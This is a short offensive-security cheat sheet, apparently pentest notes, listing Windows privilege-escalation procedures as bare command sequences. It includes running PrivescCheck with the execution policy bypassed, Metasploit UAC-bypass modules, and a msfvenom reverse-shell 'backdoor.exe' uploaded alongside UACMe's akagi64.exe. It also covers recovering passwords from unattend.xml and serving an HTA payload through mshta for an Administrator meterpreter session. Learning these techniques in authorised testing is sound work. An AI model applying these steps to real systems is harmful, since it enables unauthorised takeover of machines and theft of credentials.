# Windows Privileges Escalation

### PrivescCheck
```cmd
• get this script https://github.com/itm4n/PrivescCheck
• paste it on the target in PrivescCheck.ps1
• powershell.exe -ep bypass -c “. .\ PrivescCheck.ps1; InvokePrivescCheck”
• use the credentials resulted (username:password)
• runas.exe /user:username cmd
• enter the password
• you will get a privileged cmd
```


### UAC Bypass
```cmd
• exploit/windows/local/bypassuac_injection
• set session <session-ID>
• set target (1) windows x64
• set payload (33) windows/x64/meterpreter/reverse_tcp
```


### UAC Bypass: UACMe
```cmd
(when we get admin user with limited privileges)
• after obtaining a meterpreter session with limited privileges
account <admin>
• migrate -N explorer.exe
• shell
• net localgroup Administrators (finding admin is member)
• kali
• msfvenom -p windows/meterpreter/reverse_tcp LHOST=<myIp> LPORT=4444 -f exe > backdoor.exe
• meterpreter session
• cd C:\\Users\\<admin>\\AppData\\Local\\Temp
• upload /root/Desktop/tools/UACME/akagi64.exe .
• upload /root/backdoor.exe .
• msfconsole
• exploit/multi/handler
• set payload windows/meterpreter/reverse_tcp
• set lhost <my Ip>
• set lport 4444
• run
```

### Unattended Installation
```cmd
• powershell
• cat C:\windows\Panther\unattend.xml
• search for encoded password
• decode the password via any website
• runas.exe /user:Administrator cmd
• msfconsole
• exploit/windows/misc/hta_server
• run
• copy the <url>
• administrator cmd
• mshta.exe <url>
• we obtain a meterpreter session from Administrator
```
